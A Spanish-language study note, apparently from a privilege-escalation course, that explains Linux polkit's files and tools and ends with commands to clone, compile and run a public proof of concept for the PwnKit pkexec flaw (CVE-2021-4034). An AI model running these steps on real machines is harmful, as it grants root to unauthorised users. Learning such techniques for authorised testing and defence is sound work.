
PolicyKit (`polkit`) es un servicio de autorización en sistemas operativos que permite que el software de usuario y los componentes del sistema se comuniquen entre sí si el software de usuario está autorizado para hacerlo

Para ver si el sw de usuario esta autorizado consultamos polkit

Polkit trabaja con dos grupos de archivos.

1. Acciones/políticas (`/usr/share/polkit-1/actions`)
2. Reglas (`/usr/share/polkit-1/rules.d`)

Polkit también tiene reglas de `autoridad local` que se pueden utilizar para establecer o eliminar permisos adicionales para usuarios y grupos. Las reglas personalizadas se pueden colocar en el directorio `/etc/polkit-1/localauthority/50-local.d` con la extensión de archivo `.pkla`

PolKit también viene con tres programas adicionales:

- `pkexec` - ejecuta un programa con los derechos de otro usuario o con derechos de root
- `pkaction` - se puede usar para mostrar acciones
- `pkcheck` - se puede usar para verificar si un proceso está autorizado para una acción específica


Usaremos `pkexec` ya que tienen la misma tarea que `sudo`:

```
pkexec -u <user> <command>
pkexec -u root id
```

En la herramienta `pkexec`, se encontró la vulnerabilidad de corrupción de memoria con el identificador [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034), conocida también como [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)

1. Descargamos y compilamos el [PoC](https://github.com/arthepsy/CVE-2021-4034):

```
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```

2. Lo ejecutamos:

```
./poc
```
